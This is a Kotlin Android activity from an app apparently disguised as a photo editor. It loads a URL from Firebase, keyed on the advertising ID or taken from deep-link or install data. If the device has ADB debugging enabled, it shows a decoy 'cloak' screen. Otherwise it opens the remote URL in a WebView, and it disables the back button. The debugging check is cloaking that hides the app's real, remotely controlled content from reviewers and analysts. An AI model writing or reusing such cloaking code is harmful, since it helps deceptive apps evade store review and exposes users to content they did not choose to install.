package com.cyberlink.photodirecto.ui.activities

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.ViewModelProvider
import androidx.lifecycle.lifecycleScope
import com.cyberlink.photodirecto.MyApp
import com.cyberlink.photodirecto.databinding.LoadingActivityBinding
import com.cyberlink.photodirecto.ui.activities.cloak.CloakActivity
import com.cyberlink.photodirecto.ui.intents.AppsIntent
import com.cyberlink.photodirecto.ui.intents.DeepLinkIntent
import com.cyberlink.photodirecto.ui.states.AppsState
import com.cyberlink.photodirecto.ui.states.DeepLinkState
import com.cyberlink.photodirecto.util.CustomDatabase
import com.cyberlink.photodirecto.util.UrlMaker
import com.cyberlink.photodirecto.viewmodel.MyViewModel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class LoadingActivity : AppCompatActivity() {
    private var _binding: LoadingActivityBinding? = null
    private val binding get() = _binding!!
    private lateinit var viewModel: MyViewModel
    private val firebase = CustomDatabase()
    private val urlMaker = UrlMaker()
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        _binding = LoadingActivityBinding.inflate(layoutInflater)
        setContentView(binding.root)

        initViewModel()
        viewModel.handleDeppIntent(this@LoadingActivity)
        viewModel.handleDataIntent(this@LoadingActivity)
        observeDeepState()
        observeDataState()
//        imitateDeepIntent()
        lifecycleScope.launch(Dispatchers.IO) {
            val user = firebase.getData(MyApp.adID)
            Log.d("custom", "firebase url - $user")
            lifecycleScope.launch(Dispatchers.Main) {
                user.let {
                    if (user == null) {
                        imitateDeepIntent()
                    } else {
                        checkSecurity(user.finalUrl!!)
                    }
                }
            }
        }
    }

    private fun imitateDeepIntent() {
        lifecycleScope.launch {
            viewModel.deepIntent.send(DeepLinkIntent.FetchDeepLink)
            Log.d("customTage", "started intent")
        }
    }

    private fun initViewModel() {
        viewModel = ViewModelProvider(this)[MyViewModel::class.java]
    }

    private fun observeDeepState() {
        Log.d("customTage", "observing vm")
        lifecycleScope.launch {
            viewModel.state.collect {
                when (it) {
                    is DeepLinkState.Idle -> {
                        Log.d("customTage", "state idle")
                    }
                    is DeepLinkState.Loading -> {
                        binding.progressBar.visibility = View.VISIBLE
                        Log.d("customTage", "state loading")
                    }

                    is DeepLinkState.DeepLink -> {
                        Log.d("customTag", "new url is - ${it.deepLink}")
                        if (it.deepLink!! != "null") {
                            checkSecurity(
                                urlMaker.buildUrl(
                                    it.deepLink!!,
                                    null,
                                    this@LoadingActivity
                                )
                            )
                            viewModel.makeTag(it.deepLink, null)
                            Log.d("customTage", "state deep")
                        } else {
                            viewModel.dataIntent.send(AppsIntent.FetchAppsData)
                        }
                    }
                    is DeepLinkState.Error -> {
                        binding.progressBar.visibility = View.GONE
                        Toast.makeText(this@LoadingActivity, it.error, Toast.LENGTH_LONG).show()
                        Log.d("customTage", "deeplink state error")
                    }
                }
            }
        }
    }

    private fun observeDataState() {
        lifecycleScope.launch {
            viewModel.dataState.collect {
                when (it) {
                    is AppsState.Idle -> {
                        Log.d("customTage", "data state idle")
                    }
                    is AppsState.Loading -> {
                        binding.progressBar.visibility = View.VISIBLE
                        Log.d("customTage", "data state loading")
                    }
                    is AppsState.Data -> {
                        Log.d("customTagVM", "$it data state Data")
                        checkSecurity(urlMaker.buildUrl("null", it.data, this@LoadingActivity))
                        viewModel.makeTag("null", it.data)
                    }
                    is AppsState.Error -> {
                        binding.progressBar.visibility = View.GONE
                        Toast.makeText(this@LoadingActivity, it.error, Toast.LENGTH_LONG).show()
                        Log.d("customTage", "apps data state error")
                    }
                }
            }
        }
    }

    private fun checkSecurity(url: String) {
        if (Settings.Global.getString(
                this@LoadingActivity.contentResolver,
                Settings.Global.ADB_ENABLED
            ) == "1"
        ) {
            cloakStart()
        } else {
            webStart(url)
            Log.d("customTage", "started from saved")
        }
        Log.d("customTage", "passed security")
    }

    private fun webStart(string: String) {
        with(Intent(this, WebActivity::class.java)) {
            this.putExtra("url", string)
            startActivity(this)
            this@LoadingActivity.finish()
        }
    }

    private fun cloakStart() {
        with(Intent(this, CloakActivity::class.java)) {
            startActivity(this)
            this@LoadingActivity.finish()
        }
    }

    override fun onBackPressed() {
        //
    }

    override fun onDestroy() {
        super.onDestroy()
        _binding = null
    }
}